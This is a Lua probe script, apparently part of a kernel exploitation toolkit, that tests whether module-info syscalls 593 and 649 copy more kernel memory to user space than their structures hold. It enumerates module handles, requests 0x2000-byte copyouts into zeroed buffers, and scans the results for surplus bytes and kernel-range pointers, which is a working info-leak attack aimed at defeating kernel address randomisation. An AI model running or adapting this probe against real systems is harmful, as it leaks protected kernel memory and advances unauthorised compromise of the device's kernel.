-- CRASH_CLASS: MODERATE
-- PROBE 801a: oversized copyout from the module-info calls
--
-- sys 593 (dynlib_get_info) and sys 649 (module member) both copy a fixed kernel struct to a
-- user buffer whose length comes from the caller. The recorded shapes are 0x160 bytes for 593
-- (size at [buf+0]) and a caller length for 649. If the kernel copies the caller's length
-- instead of min(caller, sizeof(struct)), the surplus is adjacent kernel memory: a leak.
--
-- This probe asks for 0x2000 bytes into a zeroed 0x2000 page and reports the first nonzero byte
-- past the known struct size, plus any qword whose high half is in the kernel range.

print("=== PROBE 801a: OVERSIZED MODULE COPYOUT ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function A(v) return uint64(to_num(v)) end

local sc592 = make_syscall(592)
local sc593 = make_syscall(593)
local sc649 = make_syscall(649)

local SIZE = 0x2000
local buf = memory.alloc(SIZE)
local function zero()
    for i = 0, SIZE - 4, 4 do safe_wd(buf + i, 0) end
end
local function scan(limit)
    local first, kcount, examples = nil, 0, ""
    for i = 0, SIZE - 8, 4 do
        local lo = safe_rd(buf + i) or 0
        local hi = safe_rd(buf + i + 4) or 0
        if (lo ~= 0 or hi ~= 0) and not first then first = i end
        if hi >= 0xFFFF8000 and hi <= 0xFFFFFFFF then
            kcount = kcount + 1
            if #examples < 96 then
                examples = examples .. string.format(" %03X:%08X%08X", i, hi, lo)
            end
        end
    end
    return first, kcount, examples
end

print("[A] handles from 592")
local list = memory.alloc(0x400)
for i = 0, 0x3FC, 4 do safe_wd(list + i, 0) end
local cnt = memory.alloc(8)
safe_wd(cnt, 0)
pcall(function() sc592(uint64(list), uint64(0x400), uint64(cnt)) end)
local nh = safe_rd(cnt) or 0
local handles = {}
for i = 0, nh - 1 do
    local h = safe_rd(list + i * 4)
    if h then handles[#handles + 1] = h end
end
print(string.format("  count=%s", tostring(safe_rd(cnt))))

print("")
print("[B] 593 with an oversized size field")
for _, h in ipairs(handles) do
    zero()
    safe_wd(buf, SIZE)
    local ok, rv = pcall(function() return sc593(A(h), A(buf)) end)
    local r = ok and to_num(rv) or -999
    local first, kcount, ex = scan(0x160)
    print(string.format("  h=%-6s ret=%-4d first_nonzero=%s kern=%d %s",
        string.format("%X", h), r, first and string.format("%03X", first) or "-", kcount, ex))
    if r ~= 0 then break end
end

print("")
print("[C] 649 with an oversized size")
for _, h in ipairs(handles) do
    for m = 1, 8 do
        zero()
        local ok, rv = pcall(function()
            return sc649(A(h), A(m), A(buf), A(SIZE), A(0), A(0))
        end)
        local r = ok and to_num(rv) or -999
        if r == 0 then
            local first, kcount, ex = scan(0x40)
            print(string.format("  h=%-6s m=%d ret=0 first=%s kern=%d %s",
                string.format("%X", h), m, first and string.format("%03X", first) or "-", kcount, ex))
        end
    end
end

print("")
print("[D] alive")
